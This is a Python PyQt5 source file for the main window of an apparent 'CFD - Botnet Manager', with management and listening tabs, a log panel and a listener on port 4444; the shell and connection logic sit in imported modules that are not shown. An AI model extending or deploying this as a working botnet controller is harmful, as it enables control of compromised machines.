#!/usr/bin/python3

import sys
from PyQt5.QtWidgets import *
from PyQt5.QtGui import QFont, QIcon
from PyQt5 import sip
from PyQt5.QtCore import QThread, pyqtSignal
import extra, masterHelper
import threading, time
from functools import partial

# --- Tab Scripts --- #
from tabs import managementTab
from tabs import listeningTab
from windows import shell


class logPanel(QWidget):
	def __init__(self):
		super().__init__()
		self.initUI()

	def initUI(self):
		self.setWindowTitle('CFD - Log') 

		vBox = QVBoxLayout()

		self.logText = QTextEdit()
		self.logText.setReadOnly(True)
		self.log("Testing Logging Feature")

		vBox.addWidget(self.logText)
		self.setLayout(vBox)
		self.resize(600, 500)
		self.show()

	def log(self, text):
		self.logText.setText(self.logText.toPlainText() + text + "\n")

class toolbar(QMainWindow):
    
	def __init__(self):
		super().__init__()
		self.availablePorts = [4444]
		self.initUI()

	def center(self):
		qr = self.frameGeometry()
		cp = QDesktopWidget().availableGeometry().center()
		qr.moveCenter(cp)
		self.move(qr.topLeft())

	def quitApp(self):
		reply = QMessageBox.question(self, 'Message', 'Are you sure?', QMessageBox.Yes | QMessageBox.No, QMessageBox.No)

		if(reply == QMessageBox.Yes):
			QApplication.instance().quit()

	def toggleMenu(self, state):
		if state:
			self.toolbar.show()
		else:
			self.toolbar.hide()

	def initUI(self):

		QToolTip.setFont(QFont('SansSerif', 10))

		# btn = QPushButton('Quit', self)
		# btn.setToolTip('Quits The Manager')
		# btn.resize(btn.sizeHint())
		# btn.move(50, 50)
		#
		#btn.clicked.connect(self.quitApp)

		# --- MENUBAR --- #

		exitAct = QAction(QIcon(), '&Exit', self)
		exitAct.setShortcut('Ctrl+Q')
		exitAct.setStatusTip('Exits App')
		exitAct.triggered.connect(qApp.quit)

		viewStatAct = QAction('View Toolbar', self, checkable=True)
		viewStatAct.setShortcut('Ctrl+T')
		viewStatAct.setStatusTip('View Toolbar')
		viewStatAct.setChecked(True)
		viewStatAct.triggered.connect(self.toggleMenu)

		viewLogAct = QAction("View Log", self)
		viewLogAct.setShortcut("Ctrl+L")
		viewLogAct.triggered.connect(self.creatLogWindow)

		self.menubar = self.menuBar()
		fileMenu = self.menubar.addMenu('&File')
		fileMenu.addAction(exitAct)

		viewMenu = self.menubar.addMenu('&View')
		viewMenu.addAction(viewStatAct)
		viewMenu.addAction(viewLogAct)

		# -- TOOLBAR -- #
		self.toolbar = self.addToolBar('')
		self.toolbar.addAction(self.createTab(0, "Management"))
		self.toolbar.addAction(self.createTab(1, "Listening Management"))

		self.visibleWindow = QStackedWidget()

		self.setCentralWidget(self.visibleWindow)

		self.resize(800, 900)
		self.center()	
		self.setWindowTitle('CFD - Botnet Manager')  
		self.show()

		availableConns = []
		for i in range(len(self.availablePorts)):
			availableConns.append(extra.NewConnection(self.availablePorts[i]))

		self.allConns = availableConns

	def createTab(self, tabNumber, tabName):
		switchAct = QAction(QIcon(), '&' + tabName, self)
		switchAct.triggered.connect(partial(self.switchTab, tabNumber))
		return switchAct

	def switchTab(self, tabNumber):
		self.visibleWindow.setCurrentIndex(tabNumber)

	def creatLogWindow(self):
		self.logPanel = logPanel()

if __name__ == '__main__':
	app = QApplication(sys.argv)

	ex = toolbar()

	tabsList = [managementTab.init(ex), listeningTab.init(ex)]

	ex.tabs = tabsList

	for tab in tabsList:
		ex.visibleWindow.addWidget(tab)

	ex.visibleWindow.setCurrentIndex(0)

	ex.logPanel = logPanel()
	ex.logPanel.hide()

	sys.exit(app.exec_())

